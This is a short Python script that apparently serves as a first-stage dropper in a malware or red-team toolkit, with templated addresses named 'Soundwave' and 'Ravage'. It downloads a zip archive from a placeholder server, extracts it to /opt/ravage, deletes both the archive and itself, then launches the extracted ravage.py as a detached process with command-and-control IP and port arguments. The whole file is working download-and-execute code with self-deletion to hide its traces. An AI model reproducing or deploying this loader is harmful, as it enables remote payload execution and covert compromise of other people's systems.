import random
import string
from urllib import request
import os
import subprocess
from zipfile import ZipFile


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for _ in range(length))
    return result_str


WHEELIE_PATH = os.path.abspath(__file__)
RAVAGE_ZIP_FILE = f'/opt/ravage/ravage.zip'
RAVAGE_ROOT_DIR = f'/opt/ravage'
SOUNDWAVE_IP = '<>SOUNDWAVE_IP</>'
RAVAGE_IP = '<>RAVAGE_IP</>'
WEB_SERVER_PORT = '<>WEB_SERVER_PORT</>'
COMMUNICATION_PORT = '<>COMMUNICATION_PORT</>'


with request.urlopen(f'http://{SOUNDWAVE_IP}:{WEB_SERVER_PORT}/ravage') as res:
    data = res.read()

os.makedirs(os.path.dirname(RAVAGE_ZIP_FILE), exist_ok=True)

with open(RAVAGE_ZIP_FILE, 'wb') as fh:
    fh.write(data)

with ZipFile(RAVAGE_ZIP_FILE) as zf:
    zf.extractall(RAVAGE_ROOT_DIR)

os.unlink(RAVAGE_ZIP_FILE)
os.unlink(WHEELIE_PATH)

subprocess.Popen(['python3', f'{RAVAGE_ROOT_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP, COMMUNICATION_PORT], cwd=RAVAGE_ROOT_DIR, start_new_session=True)
